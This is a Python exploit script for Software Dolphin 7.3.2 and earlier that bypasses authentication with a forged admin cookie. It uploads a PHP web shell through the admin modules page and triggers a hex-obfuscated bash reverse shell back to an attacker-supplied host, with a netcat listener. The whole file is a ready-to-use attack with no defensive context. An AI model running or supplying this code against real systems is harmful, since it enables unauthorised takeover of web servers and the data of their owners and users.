# Software Dolphin <= 7.3.2 Auth bypass / RCE exploit
# (m4ud)
# Auth bypass trick credit go to Saadat Ullah

import requests
import os
import subprocess
import sys
import binascii
from urllib.parse import quote_plus
import time
from optparse import OptionParser


class burn(): 
  def __init__(self, options): 
    self.target = options.target 
    self.lhost = options.lhost  
    self.lport = options.lport  
    self.filename = "0xm4ud.zip"
    self.url = "http://" + self.target

  def upload(self, url, filename, payload):
    upload_path = '/dolphin2/administration/modules.php'
    print("\r\n(m4ud) Dolphin2 File Uploader to RCE")
    headers = { 'Cookie': "memberID=1; memberPassword[]=0xm4ud;"}
    files = {'module': (filename, open(filename, 'rb'), 'application/zip')}
    datas = {
        'submit_upload':(None, 'm4ud'),
        'csrf_token':(None, 'Still dont care about csrf')
}
    r = requests.post(url + upload_path, data=datas,
                      files=files, headers=headers, verify=False)
    os.system("rm 0xm4ud.* 2>/dev/null")
    r = requests.get(url + "/dolphin2/tmp/0xm4ud.php")

    if not r.ok:
      print("[-] Upload has failed ! [-]")

    else:
      print("\r\n[+] 0xm4ud.php has been successfully uploaded! [+]\r\n")
      print("[*] Spawning shell [*]\r\n")
      f = subprocess.Popen(["nc", "-lvnp", str(self.lport)])
      r = requests.get(url + "/dolphin2/tmp/0xm4ud.php?m4ud=" + quote_plus(payload))
      f.communicate()

  def prep(self):
    backdoor = "<?php system($_REQUEST['m4ud']); ?>"
    f = open("0xm4ud.php", 'w' )
    f.write(backdoor)
    f.close()
    os.system('zip 0xm4ud.zip 0xm4ud.php -qq')
    shell = "bash -i >&/dev/tcp/%s/%s 0>&1" % (self.lhost, self.lport)
    v = binascii.hexlify(bytes(shell, encoding='utf-8'))
    payload = "echo " + str(v, encoding='utf-8') + "|xxd -p -r|bash"
    time.sleep(1)
    self.upload(self.url, self.filename, payload)

def main():
  parser = OptionParser()
  parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address")
  parser.add_option("-p", "--lport", dest="lport", default=str(60321), help="LPORT")
  parser.add_option("-l", "--lhost", dest="lhost", help="[ Requeired ] LHOST")  
  (options, args) = parser.parse_args()  
  if options.target:  
    exploit = burn(options)  
    exploit.prep()

if __name__=="__main__":  
  main()

